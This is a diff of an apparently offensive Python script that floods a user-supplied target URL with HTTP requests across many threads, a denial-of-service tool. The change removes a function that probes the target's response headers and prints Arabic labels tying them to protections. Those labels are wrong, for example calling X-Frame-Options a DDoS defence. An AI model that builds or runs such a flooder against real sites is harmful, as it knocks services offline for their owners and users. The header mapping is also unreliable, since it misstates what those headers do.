@@ -126,26 +126,9 @@ def socket_flood(target_url):
         except:
             pass
 
-def analyze_protection(target_url):
-    try:
-        response = requests.get(target_url)
-        headers = response.headers
-        if 'X-Frame-Options' in headers:
-            print('حماية ضد الهجمات الموزعة (DDoS)')
-        elif 'Content-Security-Policy' in headers:
-            print('حماية ضد الهجمات بالبرامج النصية (XSS)')
-        elif 'X-Content-Type-Options' in headers:
-            print('حماية ضد الهجمات بالحقن (SQL Injection)')
-        else:
-            print('لا يوجد حماية')
-    except:
-        pass
-
 def main():
     target_url = input("Enter target URL: ")
     num_threads = int(input("Enter number of threads: "))
-
-    analyze_protection(target_url)
 
     for i in range(num_threads):
         threading.Thread(target=http_flood, args=(target_url,)).start()
